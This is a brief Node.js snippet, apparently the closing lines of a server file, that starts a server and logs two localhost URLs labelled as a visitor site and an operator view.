server.listen(PORT, () => {
  console.log(`\n  Domain A (visitor site):   http://localhost:${PORT}`);
  console.log(`  Domain B (operator view):  http://localhost:${PORT}/operator\n`);
});
